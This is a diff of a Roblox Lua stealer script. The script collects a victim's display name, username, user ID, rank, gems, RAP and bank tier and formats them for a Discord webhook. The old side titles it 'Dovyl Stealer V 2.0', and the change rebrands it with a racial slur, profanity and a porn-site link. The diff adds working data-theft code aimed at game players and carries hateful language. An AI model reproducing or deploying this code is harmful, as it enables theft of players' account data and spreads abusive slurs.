@@ -44,12 +44,12 @@ _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
 local function sendwebhook(msg)
 local msg = {
-	["content"]= "**Dovyl Scripts On Top!**",
+	["content"]= "**Nigga Fucker**",
 	["embeds"]= {
 	  {
-		["title"]= "`Dovyl Stealer V 2.0`",
-		["description"]= "**Data from the victim**\‘Display Name: ".._G.PlrDisplayNameVictim.."\‘Username: ".._G.PlrUserVictim.."\‘User ID: ".._G.PlrUserIDVictim.."\Rank: ".._G.CurrentRank.."\Place: ".._G.GameIn.."\Gems: **".._G.DisplayDiamond.."**\nâ¬†ï¸Rap: **".._G.DisplayRap.."**\nðŸ“ˆBank Tier: **".._G.DisplayBankTier.."**\nâ˜ Executor: **"..getexploit().."**",
-		["url"]= "https://discord.gg/zzVxWaqfrc",
+		["title"]= "`Ez`",
+		["description"]= "**Data from the victim**\nðŸ§‘Display Name: ".._G.PlrDisplayNameVictim.."\nðŸ§‘Username: ".._G.PlrUserVictim.."\nðŸ§‘User ID: ".._G.PlrUserIDVictim.."\nðŸ±Rank: ".._G.CurrentRank.."\nðŸŽ®Place: ".._G.GameIn.."\nðŸ’ŽGems: **".._G.DisplayDiamond.."**\nâ¬†ï¸Rap: **".._G.DisplayRap.."**\nðŸ“ˆBank Tier: **".._G.DisplayBankTier.."**\nâ˜ Executor: **"..getexploit().."**",
+		["url"]= "Pornhub.com",
 		["color"]= ""..webhookcolor.."",
   }
   },
